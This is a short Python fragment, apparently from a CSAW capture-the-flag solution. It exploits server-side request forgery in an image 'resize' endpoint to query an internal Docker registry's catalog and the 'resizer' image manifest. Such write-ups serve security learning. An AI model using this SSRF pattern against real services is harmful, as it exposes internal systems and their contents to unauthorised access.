...
print(requests.get('http://red.chal.csaw.io:8268/resize', params={'url': 'http://red.chal.csaw.io:9000/v2/_catalog'}).text)

asdf = requests.get('http://red.chal.csaw.io:8268/resize', params={'url': 'http://red.chal.csaw.io:9000/v2/resizer/manifests/latest'}).text
